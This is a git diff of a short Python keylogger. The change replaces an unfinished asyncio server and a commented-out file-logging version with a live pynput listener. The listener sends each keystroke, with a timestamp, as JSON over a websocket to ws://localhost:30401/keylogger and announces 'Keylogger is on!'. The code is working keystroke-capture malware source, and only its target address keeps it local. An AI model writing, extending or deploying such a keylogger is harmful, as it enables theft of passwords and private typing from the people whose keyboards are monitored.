@@ -1,12 +1,15 @@
 # the library used for key-press event listeners
 from pynput.keyboard import Key, Listener
-
 # for logging
 import logging
-
 # for websocket
-import asyncio
-import websockets
+from websocket import create_connection
+# for printing timestamp
+from datetime import datetime
+# for json encoding
+import json
+
+ws = create_connection("ws://localhost:30401/keylogger")
 
 # make a log file
 logging.basicConfig(filename="key_log.txt", filemode='w', level=logging.DEBUG, format='%(asctime)s: %(message)s:')
@@ -15,31 +18,24 @@ logging.basicConfig(filename="key_log.txt", filemode='w', level=logging.DEBUG, f
 key_pressed = ''
 
 
-async def send_keys(websocket, path):
-    print(websocket)
-    await websocket.send(key_pressed)
+# on_press function => logging the pressed key
+# is stopped when ctrl+z is pressed
+def on_press(key):
+    if hasattr(key, 'char') and key.char == '\x1a':
+        ws.close()
+        return False
+    if hasattr(key, 'char') and key.char == "'":
+        ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "quote" }')
+        return
+    ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "' + str(key) + '" }')
 
 
-start_server = websockets.serve(send_keys, "localhost", 8765)
+# on_release function => logging the released key
+def on_release(key):
+    pass
 
-asyncio.get_event_loop().run_until_complete(start_server)
-asyncio.get_event_loop().run_forever()
 
-#
-# # on_press function => logging the pressed key
-# # is stopped when ctrl+z is pressed
-# def on_press(key):
-#     if hasattr(key, 'char') and key.char == '\x1a':
-#         return False
-#     logging.info(str(key))
-#
-#
-# # on_release function => logging the released key
-# def on_release(key):
-#     pass
-#
-#
-# # the actual listener
-# with Listener(on_press=on_press, on_release=on_release) as listener:
-#     print('Keylogger is on!')
-#     listener.join()
+# the actual listener
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    print('Keylogger is on!')
+    listener.join()
